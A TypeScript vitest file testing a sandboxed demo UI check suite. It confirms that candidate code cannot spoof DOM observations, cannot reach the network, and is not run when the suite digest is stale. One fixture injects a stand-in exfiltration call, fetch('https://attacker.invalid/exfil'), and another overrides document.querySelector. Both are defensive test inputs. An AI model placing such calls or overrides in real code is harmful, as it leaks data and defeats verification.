import { describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { demoUiSuiteDigest, runDemoUiSuite } from '../../packages/git-runner/checks/demo-ui-suite.js';
import { buildPaginatedDemo, paginatedClientScript, preparedPaginatedDemo } from '../fixtures/paginated-demo.js';

const applicability = { projectId: 'demo-project', viewId: 'demo-view', manifestDigest: 'a'.repeat(64), composedCommitOid: 'b'.repeat(40), treeOid: 'c'.repeat(40), contractVersion: 1, policyVersion: 1, checkSuiteDigest: demoUiSuiteDigest() };
async function fixture(source: string): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'demo-ui-security-'));
  await mkdir(join(root, 'demo/seed'), { recursive: true });
  await writeFile(join(root, 'demo/seed/index.ts'), source);
  return root;
}
const run = async (root: string) => (await runDemoUiSuite({ candidateDirectory: root, applicability }))[0]!;
const parsedFacts = (result: Awaited<ReturnType<typeof run>>) => JSON.parse(result.execution.stdout).facts;

describe('demo UI oracle security', () => {
  it('does not let candidate-modified DOM or Array APIs spoof trusted observations', async () => {
    const source = buildPaginatedDemo(`${paginatedClientScript}\ndocument.querySelector=()=>null;`);
    const root = await fixture(source);
    try {
      const result = await run(root);
      expect(result.result, JSON.stringify(parsedFacts(result))).toBe('passed');
      expect(parsedFacts(result).events[0].dom.ids).toEqual(['a-project-01', 'a-project-02']);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);

  it('blocks and records external requests without reaching host networking', async () => {
    const source = buildPaginatedDemo(`${paginatedClientScript} fetch('https://attacker.invalid/exfil').catch(()=>{});`);
    const root = await fixture(source);
    try {
      const result = await run(root);
      const facts = parsedFacts(result);
      expect(result.result).toBe('failed');
      expect(facts.failures.join(' ')).toMatch(/Blocked unknown UI request|Expected UI state|CSP|security/i);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);

  it('rejects stale applicability digest before launching candidate code', async () => {
    const root = await fixture("throw new Error('candidate executed'); export function createProjectListHandler(){return async()=>Response.json([])}");
    try {
      await expect(runDemoUiSuite({ candidateDirectory: root, applicability: { ...applicability, checkSuiteDigest: '0'.repeat(64) } })).rejects.toThrow(/digest/i);
      expect(await import('node:fs/promises').then(({ readFile }) => readFile(join(root, 'demo/seed/index.ts'), 'utf8'))).toContain('candidate executed');
    } finally { await rm(root, { recursive: true, force: true }); }
  });
});
